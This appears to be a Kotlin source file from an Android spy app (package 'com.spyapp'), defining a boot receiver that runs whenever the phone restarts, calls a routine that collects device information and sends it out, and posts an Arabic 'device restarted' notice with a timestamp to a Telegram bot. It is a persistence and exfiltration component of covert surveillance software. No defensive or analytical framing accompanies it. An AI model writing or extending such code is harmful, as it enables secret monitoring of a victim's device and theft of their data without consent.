package com.spyapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import java.text.SimpleDateFormat
import java.util.*

class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_BOOT_COMPLETED &&
            intent.action != "android.intent.action.QUICKBOOT_POWERON") {
            return
        }

        DeviceInfo.collectAndSend(context)

        val msg = buildString {
            appendLine("🔄 *تم إعادة تشغيل الجهاز*")
            appendLine("🕐 _${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}_")
        }

        TelegramBot.send(context, msg)
    }
}
